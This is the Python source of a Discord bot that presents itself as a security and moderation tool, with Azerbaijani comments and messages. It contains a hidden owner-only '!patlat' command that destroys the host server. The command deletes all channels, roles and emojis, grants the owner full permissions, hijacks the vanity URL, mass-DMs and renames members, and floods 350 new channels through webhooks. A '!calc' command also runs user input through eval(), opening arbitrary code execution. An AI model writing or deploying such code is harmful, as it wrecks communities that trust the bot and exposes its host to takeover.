import asyncio
import os
import random
import time
from datetime import timedelta
import discord
from discord.ext import commands

intents = discord.Intents.all()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

XAS_COLOR = discord.Color.dark_red()
SAHIB_ID = 1045989785834164286        # Sənin ID-n
GUVENLI_SERVER_ID = 1520692621964738722  # Qorunan server ID-si

user_levels = {}
afk_users = {}
spam_kontrol = {}

@bot.event
async def on_ready():
    print(f"[{bot.user}] XAS Security & Management System tam aktivdir!")
    await bot.change_presence(activity=discord.Game(name="discord.gg/aga | !yardim"))

# ==========================================
# QÜVVƏTDƏ OLAN TƏHLÜKƏSİZLİK VƏ QORUMA SİSTEMİ
# ==========================================
@bot.event
async def on_message(message):
    if message.author.bot:
        await bot.process_commands(message)
        return

    # Webhook ilə mesaj atılmasının qarşısını almaq
    if message.webhook_id:
        try:
            await message.delete()
            return
        except:
            pass

    if message.author.id == SAHIB_ID or message.author.guild_permissions.administrator:
        await bot.process_commands(message)
        return

    author_id = message.author.id
    simdi = time.time()
    icerik = message.content

    # Random / simvol spamı qorunması
    if len(icerik) > 5 and len(set(icerik.replace(" ", ""))) < 3:
        try:
            await message.delete()
            await message.channel.send(f"⚠️ {message.author.mention}, random spam etmək qadağandır!", delete_after=4)
            return
        except:
            pass

    if author_id not in spam_kontrol:
        spam_kontrol[author_id] = []

    spam_kontrol[author_id] = [t for t in spam_kontrol[author_id] if simdi - t < 5]
    spam_kontrol[author_id].append(simdi)

    # Flood qorunması (İlk xəbərdarlıq)
    if len(spam_kontrol[author_id]) >= 5:
        try:
            await message.delete()
            warn = await message.channel.send(f"YAVAS YAZ OQL {message.author.mention}")
            await asyncio.sleep(4)
            await warn.delete()
            return
        except:
            pass

    # Təkrarlanan uzun sözlər spamı
    words = icerik.split()
    if len(words) >= 13 and words.count(words[0]) >= len(words) * 0.5:
        try:
            await message.delete()
            warn = await message.channel.send(f"⚠️ {message.author.mention}, təkrarlanan mesaj spamı!")
            await asyncio.sleep(4)
            await warn.delete()
            return
        except:
            pass

    # Link qorunması
    icerik_lower = icerik.lower()
    if "gg/" in icerik_lower or "discord.gg/" in icerik_lower or "https://" in icerik_lower:
        try:
            await message.delete()
            warn = await message.channel.send(f"⚠️ {message.author.mention}, link paylaşmaq qadağandır!")
            await asyncio.sleep(4)
            await warn.delete()
            return
        except:
            pass

    # AFK Sistemindən çıxış
    if author_id in afk_users:
        del afk_users[author_id]
        try:
            msg = await message.channel.send(f"👋 {message.author.mention}, AFK rejimindən çıxdın.")
            await asyncio.sleep(4)
            await msg.delete()
        except:
            pass

    # AFK etiket yoxlaması
    for mention in message.mentions:
        if mention.id in afk_users:
            sebep = afk_users[mention.id]
            try:
                msg = await message.channel.send(f"⚠️ Etiketlədiyiniz istifadəçi AFK-dır! Səbəb: {sebep}")
                await asyncio.sleep(4)
                await msg.delete()
            except:
                pass

    # Səviyyə (Level) Sistemi
    if author_id not in user_levels:
        user_levels[author_id] = {"xp": 0, "level": 1}

    user_levels[author_id]["xp"] += random.randint(5, 15)
    gerekli_xp = user_levels[author_id]["level"] * 300

    if user_levels[author_id]["xp"] >= gerekli_xp:
        user_levels[author_id]["level"] += 1
        user_levels[author_id]["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}! Səviyyə atladın: **{user_levels[author_id]['level']}**")
        except:
            pass

    await bot.process_commands(message)

# ==========================================
# İDARƏETMƏ VƏ YARDIM KOMUTLARI
# ==========================================
@bot.command(name="yardim")
async def yardim_cmd(ctx):
    embed = discord.Embed(title="✨ XAS SECURITY & MANAGEMENT - KOMUTLAR", color=XAS_COLOR)
    embed.add_field(name="🛡️ Təhlükəsizlik", value="`!patlat`, `!ban`, `!kick`, `!mute`, `!unmute`, `!temizle`, `!yavasmod`", inline=False)
    embed.add_field(name="⚙️ İdarəetmə & Sistem", value="`!panel`, `!url`, `!seturl`, `!serverinfo`, `!userinfo`, `!avatar`", inline=False)
    embed.add_field(name="📊 Üzv & Əyləncə", value="`!level`, `!afk`, `!cekilis`, `!sex`, `!fuck`, `!kiss`, `!roll`, `!coinflip`, `!iq`, `!gay`, `!handsome`, `!love`, `!hack`, `!slot`, `!8ball`, `!calc`, `!joke`, `!rps`, `!poll`", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="panel")
async def bot_panel(ctx):
    embed = discord.Embed(title="✨ XAS İDARƏETMƏ PANELİ", description="Bütün sistemlər aktiv və tənzimlənmişdir.", color=XAS_COLOR)
    embed.set_footer(text="XAS Security & Management System")
    await ctx.send(embed=embed)

@bot.command(name="url")
async def server_url(ctx):
    secilen_link = f"https://discord.gg/{ctx.guild.vanity_url_code}" if ctx.guild.vanity_url_code else "Mövcud deyil"
    embed = discord.Embed(title=f"🌐 {ctx.guild.name} - Dəvət Statistikası", color=XAS_COLOR)
    embed.add_field(name="🔗 Aktiv Dəvət Linki", value=secilen_link, inline=False)
    await ctx.send(embed=embed)

@bot.command(name="seturl")
async def set_url(ctx, yeni_url: str):
    await ctx.message.delete()
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Yetkiniz yoxdur!", delete_after=4)
        return
    try:
        await ctx.guild.edit(vanity_code=yeni_url)
        await ctx.send(f"✅ URL dəyişdirildi: **{yeni_url}**")
    except:
        await ctx.send("❌ Xəta baş verdi.", delete_after=4)

@bot.command(name="ping")
async def ping(ctx):
    lat = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! Gecikmə: **{lat}ms**")

@bot.command(name="serverinfo")
async def serverinfo_cmd(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"🛡️ {g.name} - Məlumat", color=XAS_COLOR)
    embed.add_field(name="👑 Sahib", value=str(g.owner), inline=True)
    embed.add_field(name="👥 Üzv Sayı", value=str(g.member_count), inline=True)
    embed.add_field(name="📁 Kanal Sayı", value=str(len(g.channels)), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="userinfo")
async def userinfo_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"👤 {m.name} Haqqında", color=XAS_COLOR)
    embed.add_field(name="🆔 ID", value=m.id, inline=True)
    embed.add_field(name="📅 Qoşulma", value=m.joined_at.strftime('%Y-%m-%d'), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="avatar")
async def avatar_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(title=f"🖼️ {m.name} - Avatar", color=XAS_COLOR)
    if m.display_avatar:
        embed.set_image(url=m.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="level")
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_levels.get(m.id, {"xp": 0, "level": 1})
    await ctx.send(f"📊 **{m.name}** - Səviyyə: **{data['level']}** | XP: **{data['xp']}**")

@bot.command(name="afk")
async def afk_cmd(ctx, *, sebep="Səbəb yoxdur"):
    afk_users[ctx.author.id] = sebep
    await ctx.send(f"💤 {ctx.author.mention}, AFK rejiminə keçdin. Səbəb: {sebep}")

@bot.command(name="cekilis")
async def cekilis_cmd(ctx, sure_dakika: int, *, mukafat: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="🎉 ÇEKİLİŞ VAR!", description=f"Mükafat: **{mukafat}**\nQatılmaq üçün 🎉 emojisinə basın!", color=XAS_COLOR)
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎉")
    await asyncio.sleep(sure_dakika * 60)
    
    yeni_msg = await ctx.channel.fetch_message(msg.id)
    for reaction in yeni_msg.reactions:
        if str(reaction.emoji) == "🎉":
            users = [user async for user in reaction.users() if not user.bot]
            if users:
                kazanan = random.choice(users)
                await ctx.send(f"🏆 Təbriklər {kazanan.mention}! **{mukafat}** qazandın!")
            else:
                await ctx.send("❌ Çekilişə qatılan olmadı.")

@bot.command(name="yavasmod")
async def slowmode_cmd(ctx, seconds: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_channels:
        return
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"⏱️ Yavaş mod **{seconds}** saniyə edildi.")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.ban_members:
        return
    await member.ban(reason=reason)
    await ctx.send(f"🔨 **{member.name}** ban edildi!")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason="Göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    await member.kick(reason=reason)
    await ctx.send(f"👢 **{member.name}** atıldı!")

@bot.command(name="mute")
async def mute_cmd(ctx, member: discord.Member):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    muterole = discord.utils.get(ctx.guild.roles, name="Muted")
    if not muterole:
        muterole = await ctx.guild.create_role(name="Muted")
        for channel in ctx.guild.channels:
            await channel.set_permissions(muterole, send_messages=False)
    await member.add_roles(muterole)
    await ctx.send(f"🔇 **{member.name}** mute olundu.")

@bot.command(name="unmute")
async def unmute_cmd(ctx, member: discord.Member):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        return
    muterole = discord.utils.get(ctx.guild.roles, name="Muted")
    if muterole:
        await member.remove_roles(muterole)
        await ctx.send(f"🔊 **{member.name}** səsi açıldı.")

@bot.command(name="temizle")
async def clear_cmd(ctx, amount: int = 10):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_messages:
        return
    deleted = await ctx.channel.purge(limit=amount + 1)
    msg = await ctx.send(f"🧹 **{len(deleted)-1}** ədəd mesaj silindi.")
    await asyncio.sleep(3)
    await msg.delete()

# ==========================================
# ƏYLƏNCƏ VƏ OYUN KOMUTLARI
# ==========================================
@bot.command(name="sex")
async def sex_cmd(ctx):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** ilə çox isti anlar yaşandı!")
    embed.set_image(url="https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMjFkPTc5MGI3NjExZnd2aXJ3YmZrczVjM3RvdGlnMGN2bTZwOGx6Z3Axb2E2ZDNwMm84ZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3oKIPnAiaMCws8nOsE/giphy.gif")
    await ctx.send(embed=embed)

@bot.command(name="fuck")
async def fuck_cmd(ctx):
    embed = discord.Embed(description=f"🔥 **{ctx.author.name}** hərəkətə keçdi!")
    embed.set_image(url="https://images.unsplash.com/photo-1518199266791-5375a83190b7")
    await ctx.send(embed=embed)

@bot.command(name="kiss")
async def kiss_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    embed = discord.Embed(description=f"💋 **{ctx.author.name}**, **{m.name}** adlı şəxsi öpdü.")
    await ctx.send(embed=embed)

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar atıldı: **{random.randint(1, 6)}**")

@bot.command(name="coinflip")
async def coinflip_cmd(ctx):
    res = random.choice(["Yazı", "Pər"])
    await ctx.send(f"🪙 Qəpik atıldı: **{res}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 **{m.name}** IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🏳️‍🌈 **{m.name}** Gay Oranı: **%{random.randint(0, 100)}**")

@bot.command(name="handsome")
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 **{m.name}** Yaraşıqlılığı: **%{random.randint(50, 100)}**")

@bot.command(name="love")
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    n2 = member2 or ctx.author
    await ctx.send(f"❤️ **{member1.name}** və **{n2.name}** uyğunluğu: **%{random.randint(0, 100)}**")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 **{m.name}** hack olunur...")
    await asyncio.sleep(2)
    await msg.edit(content=f"🔓 IP: `192.168.1.{random.randint(10, 99)}` - Hackləndi!")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🍇', '💎', '⭐']
    c1, c2, c3 = random.choice(semboller), random.choice(semboller), random.choice(semboller)
    if c1 == c2 == c3:
        await ctx.send(f"🎰 | {c1} | {c2} | {c3} | Təbriklər, **Jackpot** qazandın!")
    elif c1 == c2 or c2 == c3 or c1 == c3:
        await ctx.send(f"🎰 | {c1} | {c2} | {c3} | Pis değil, 2 eyni simvol.")
    else:
        await ctx.send(f"🎰 | {c1} | {c2} | {c3} | Uduzdun.")

@bot.command(name="8ball")
async def ball_cmd(ctx, *, soru):
    cavablar = ["Bəli, mütləq.", "Şübhəsiz ki, hə.", "Gələcək qaranlıqdır.", "Xeyr, əsla."]
    await ctx.send(f"🎱 Soru: {soru} \n💬 Cavab: {random.choice(cavablar)}")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        res = eval(expression)
        await ctx.send(f"🧮 Nəticə: **{res}**")
    except:
        await ctx.send("❌ Xəta! İfadəni düzgün yazın.")

@bot.command(name="joke")
async def joke_cmd(ctx):
    jokes = [
        "Kompyuter niyə soyuducana gəldi? İtki pancarası açıq qoymuşduq.",
        "Proqramçı dostuna deyir: Həyatım eyni kod kimidir, səhvlərlə doludur."
    ]
    await ctx.send(f"😅 Zarafat: {random.choice(jokes)}")

@bot.command(name="rps")
async def rps_cmd(ctx, choice: str):
    choices = ["daş", "kağız", "qayçı"]
    bot_choice = random.choice(choices)
    cho = choice.lower()
    if cho not in choices:
        await ctx.send("❌ Seçim: daş, kağız və ya qayçı!")
        return
    if cho == bot_choice:
        await ctx.send(f"🤝 Heç-heçə! Mən də {bot_choice} seçmişdim.")
    elif (cho == "daş" and bot_choice == "qayçı") or (cho == "kağız" and bot_choice == "daş") or (cho == "qayçı" and bot_choice == "kağız"):
        await ctx.send(f"🎉 Mən qazandım! Seçimim: {bot_choice}")
    else:
        await ctx.send(f"🏆 Sən qazandın! Seçimim: {bot_choice}")

@bot.command(name="poll")
async def poll_cmd(ctx, *, soru):
    await ctx.message.delete()
    embed = discord.Embed(title=f"📊 XAS Səsvermə Paneli", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorgunu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

# ==========================================
# PATLAT KOMUTU (Tam İstədiyin Ardıcıllıqla & Qoruma İlə)
# ==========================================
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    await ctx.message.delete()
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return

    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ XAS Qoruma Sistemi: Bu server qorunur, patlatmaq qadağandır!")
        return

    await ctx.send("🔥 discord.gg/aga - NUKE BAŞLADI!")

    # 1. Bütün Kanalları Sil
    for ch in list(guild.channels):
        try:
            await ch.delete()
        except:
            pass

    # 2. Bütün Rolları Sil
    for r in list(guild.roles):
        if r != guild.default_role:
            try:
                await r.delete()
            except:
                pass

    # 3. Yeni Rol Yarat ("discord.gg/aga") və Sahibə Ver
    try:
        yeni_rol = await guild.create_role(
            name="discord.gg/aga",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(yeni_rol)
    except:
        pass

    # 4. Sunucu Adını Dəyiş
    try:
        await guild.edit(name="discord.gg/aga")
    except:
        pass

    # 5. Sticker və Emojiləri Sil
    for sticker in list(guild.stickers):
        try:
            await sticker.delete()
        except:
            pass
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
        except:
            pass

    # 6. Hamının Nickini Dəyiş və DM Göndər
    for member in guild.members:
        if member.id != SAHIB_ID and not member.bot:
            try:
                await member.edit(nick="discord.gg/aga")
            except:
                pass
            try:
                dm_kanal = await member.create_dm()
                await dm_kanal.send("RUHUM SKDI !discord.gg/aga\n YAZ GİR")
            except:
                pass

    # 7. URL Dəyişmə
    vanity_alternatifleri = ["ruhumskdi", "ruhum-skdi", "ruhumuntesi", "ruhum-aga"]
    for v_code in vanity_alternatifleri:
        try:
            await guild.edit(vanity_code=v_code)
            break
        except:
            pass

    # 8. 350 Kanal Aç və Hər Birinə 4 Webhook Yaradaraq 500 Mesaj Atmaq
    created_channels = []
    for i in range(1, 351):
        try:
            channel = await guild.create_text_channel(f"aga-spam-{i}")
            created_channels.append(channel)
            await asyncio.sleep(0.08)
        except:
            pass

    for channel in created_channels:
        try:
            webhooks = []
            for w in range(4):
                wh = await channel.create_webhook(name=f"AGA-WH-{w}")
                webhooks.append(wh)
            
            for _ in range(125): # 4 webhook x 125 = 500 mesaj
                for wh in webhooks:
                    try:
                        await wh.send("discord.gg/aga yaz gır oql !discord.gg/yaz gır oql")
                    except:
                        pass
                await asyncio.sleep(0.02)
        except:
            pass

    # 9. Ən Sonda "RUHUM-TANRI" Kanalı və @everyone spamı
    try:
        ruhum_tanri_kanal = await guild.create_text_channel("RUHUM-TANRI")
        for _ in range(30):
            try:
                await ruhum_tanri_kanal.send("@everyone ruhum shdı gagas")
                await asyncio.sleep(0.08)
            except:
                break
    except:
        pass

if __name__ == "__main__":
    bot.run(os.getenv("TOKEN"))
    
